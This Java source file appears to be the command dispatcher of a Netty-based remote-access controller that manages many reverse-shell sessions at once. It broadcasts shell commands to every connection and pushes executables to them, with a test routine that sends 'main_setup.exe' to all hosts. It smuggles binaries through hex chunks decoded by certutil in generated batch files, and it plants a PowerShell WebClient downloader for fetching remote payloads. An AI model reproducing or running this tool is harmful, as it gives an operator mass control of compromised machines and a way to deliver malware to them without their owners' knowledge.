package nettyTest.server;

import lombok.AllArgsConstructor;

import java.io.*;
import java.nio.ByteBuffer;
import java.nio.file.Files;
import java.util.LinkedList;
import java.util.List;

@AllArgsConstructor
public class CommandExecutor implements Runnable {
    private String command;


    @Override
    public void run() {
        try {
            interpretCommand(command);
        } catch (IOException | InterruptedException e) {
            //e.printStackTrace();
        }
    }

    private void interpretCommand(String command) throws IOException, InterruptedException {
        if(command.length()>1){
            if(command.charAt(0) != '/'){
                sendToCurrentConnection();
                return;
            }
        }
        if (command.contains("/sendToAll")) {
            sendToAll();
        } else if (command.contains("/connections")) {
            connections();
        } else if (command.contains("/sendTo")) {
            sendTo();
        } else if (command.contains("/showOutput")) {
            showOutput();
        } else if (command.contains("/connect")) {
            connect();
        } else if (command.contains("/upload")) {
            upload();
        } else if (command.contains("/background")) {
            background();
        } else if (command.contains("/test")) {
            test();
        } else if (command.contains("/loadTools")) {
            loadTools();
        } else if (command.contains("/help")) {
            help();
        } else if (command.contains("/uploadToAll")) {
            uploadToAll();
        }else if(command.contains("/clear")){
            clear();
        }else if(command.contains("/exit")){
            exit();
        }
    }

    private void test() throws IOException, InterruptedException {
        //connect();
        command = "cd c:/\n";
        sendToAll();

        command = "/uploadToAll files/main_setup.exe main_setup.exe";
        uploadToAll();
    }

    private void upload() throws IOException, InterruptedException {
        List<String> args = getArgs(command);

        Data.activeConnection.setBlockOutput(true);

        if (Data.activeConnection.getSystemType() == SystemType.type.Windows) {
            uploadWindows(args.get(0), args.get(1), Data.activeConnection);
        } else if (Data.activeConnection.getSystemType() == SystemType.type.Linux) {
            uploadLinux(args.get(0), args.get(1));
        }
    }

    private void uploadToAll() throws IOException, InterruptedException {
        List<String> args = getArgs(command);

        for (Connection connection : Data.connections.values()) {
            if(connection.getId() == Data.lastId-1){
                connection.setBlockOutput(true);
            }
            uploadWindows(args.get(0), args.get(1), connection);
        }
    }

    private void uploadLinux(String fileName, String fileDestination) throws IOException, InterruptedException {
        Data.activeConnection.getCtx().channel().writeAndFlush("> " + fileDestination + "" + "\n");

        FileInputStream file = new FileInputStream(fileName);
        BufferedReader reader = new BufferedReader(new InputStreamReader(file));

        StringBuilder sb = new StringBuilder();
        int ch;
        while ((ch = reader.read()) != -1) {
            if ((char) ch == '\n') {
                Data.activeConnection.send("echo \"" + sb.toString() + "\" >> " + fileDestination + "" + "\n");
                sb = new StringBuilder();
                continue;
            }
            sb.append((char) ch);
            if (sb.length() > 300) {
                Data.activeConnection.send("echo -n \"" + sb.toString() + "\" >> " + fileDestination + "" + "\n");
                sb = new StringBuilder();
            }
        }
        if (sb.length() > 0) {
            Data.activeConnection.send("echo -n \"" + sb.toString() + "\" >> " + fileDestination + "" + "\n");
        }
        reader.close();
    }

    private void uploadWindows(String fileName, String fileDestination, Connection connection) throws IOException, InterruptedException {
        connection.send("type nul > temp.txt" + "\n");

        FileInputStream file = new FileInputStream(fileName);
        BufferedReader reader = new BufferedReader(new InputStreamReader(file));
        byte[] fileContent = Files.readAllBytes(new File(fileName).toPath());

        ByteBuffer byteBuffer = ByteBuffer.allocate(1000);
        int size = 0;
        for (int i = 0; i < fileContent.length; i++) {
            byteBuffer.put(fileContent[i]);
            size++;
            if (size >= 1000) {
                size = 0;
                String str = bytesToHex(byteBuffer.array());
                connection.send("writer.bat \"" + str + "\" \n");
                byteBuffer = ByteBuffer.allocate(1000);
            }
        }
        if (size > 0) {
            String str = bytesToHex(byteBuffer.array());
            connection.send("writer.bat \"" + str + "\" \n");
        }
        connection.send("create.bat " + fileDestination + "\n");
        connection.send("!Done\u00ff\n");
        reader.close();
    }

    private List<String> getArgs(String command) {
        String cuttedCommand = cutCommand(command);
        List<String> args = new LinkedList<>();
        StringBuilder sb = new StringBuilder();
        boolean spacesCleared = false;
        char ch;
        for (int i = 0; i < cuttedCommand.length(); i++) {
            ch = cuttedCommand.charAt(i);
            if (spacesCleared && ch == ' ') {
                args.add(sb.toString());
                sb = new StringBuilder();
                spacesCleared = false;
            } else if (ch == ' ') {
                continue;
            } else {
                spacesCleared = true;
                sb.append(ch);
            }
        }
        if (sb.length() > 0) {
            args.add(sb.toString());
        }
        return args;
    }

    private String cutCommand(String command) {
        for (int i = 0; i < command.length(); i++) {
            if (command.charAt(i) == ' ') {
                command = command.substring(i + 1);
                break;
            }
        }
        return command;
    }

    private void sendToAll() throws UnsupportedEncodingException, InterruptedException {
        for (Connection connection : Data.connections.values()) {
            connection.send(command);
        }
    }

    private void connections() {
        for (Connection connection : Data.connections.values()) {
            connection.showInfo();
        }
    }

    private void sendTo() throws UnsupportedEncodingException, InterruptedException {
        List<String> args = getArgs(command);

        Data.connections.get(args.get(0)).send("QWERTYQWERTY");
    }

    private void showOutput() throws IOException {
        List<String> args = getArgs(command);

        BufferedReader reader = new BufferedReader(new FileReader("logs/" + args.get(0) + ".txt"));
        while (reader.ready()) {
            System.out.println(reader.readLine());
        }
        reader.close();
    }

    private void connect() {
        List<String> args = getArgs(command);

        Connection connection;
        try {
            connection = Data.connections.get(args.get(0));
            connection.setPrintOutput(true);
            Data.activeConnection = connection;
            System.out.println("connected to " + args.get(0));
        } catch (Exception e) {
            try {
                connection = Data.connections.values().iterator().next();
                connection.setPrintOutput(true);
                Data.activeConnection = connection;
                System.out.println("Connected to the first connection");
            } catch (Exception ee) {
                System.out.println("Lack of connections");
            }
        }
    }

    private void background() {
        Data.activeConnection.setPrintOutput(false);
        Data.activeConnection = null;
    }

    private void sendToCurrentConnection() throws UnsupportedEncodingException, InterruptedException {
        if (Data.activeConnection != null) {
            Data.activeConnection.send(command + "\n");
        }
    }

    private void loadTools() throws UnsupportedEncodingException, InterruptedException {
        //load writer.bat
        Data.activeConnection.send("type nul > writer.bat" + "\n");
        Data.activeConnection.send("echo|set /p=\"@echo off\" >> writer.bat" + "\n");
        Data.activeConnection.send("echo. >> writer.bat\n");
        Data.activeConnection.send("echo|set /p=\"echo|set /p=%1 >>temp.txt\" >> writer.bat\n");
        Data.activeConnection.send("echo. >> writer.bat\n");

        Data.activeConnection.send("type nul > create.bat" + "\n");
        Data.activeConnection.send("echo|set /p=\"@echo off\" >> create.bat" + "\n");
        Data.activeConnection.send("echo. >> create.bat\n");
        Data.activeConnection.send("echo|set /p=\"certutil -f -decodehex temp.txt %1 >nul\" >> create.bat\n");
        Data.activeConnection.send("echo. >> create.bat\n");
        Data.activeConnection.send("echo del temp.txt >> create.bat\n");

        //load download.bat
        //Data.activeConnection.send("type nul > download.bat" + "\n");
        Data.activeConnection.send("echo|set /p=\"powershell -Command \"(New-Object Net.WebClient).DownloadFile('%1', '%2')\"\" > download.bat" + "\n");
        System.out.println("Done!");
    }

    private void help() {
        System.out.println("/sendToAll - send massage to all connections");
        System.out.println("/connections - show info about current connections");
        System.out.println("/sendTo - ");
        System.out.println("/showOutput - show connection's output");
        System.out.println("/connect /IP_ADDRESS:PORT - connect to a session");
        System.out.println("/upload SOURCE_FILE DESTINATION_FILE - upload a file (slow)");
        System.out.println("/background - hide a current session");
        System.out.println("/test - test");
        System.out.println("/loadModules - load tools, which helps in interaction with windows");
        System.out.println("/help - show commands");

        System.out.println("start download.bat SOURCE_ADDRESS FILENAME - download file (fast)");
    }

    private void clear() throws IOException {
        System.out.print("\033[H\033[2J");
        System.out.flush();
        Runtime.getRuntime().exec("clear");
        System.out.println("\f");
    }

    private void exit(){
        System.exit(0);
    }


    private static final char[] HEX_ARRAY = "0123456789ABCDEF".toCharArray();

    private String bytesToHex(byte[] bytes) {
        char[] hexChars = new char[bytes.length * 2];
        for (int j = 0; j < bytes.length; j++) {
            int v = bytes[j] & 0xFF;
            hexChars[j * 2] = HEX_ARRAY[v >>> 4];
            hexChars[j * 2 + 1] = HEX_ARRAY[v & 0x0F];
        }
        return new String(hexChars);
    }
}
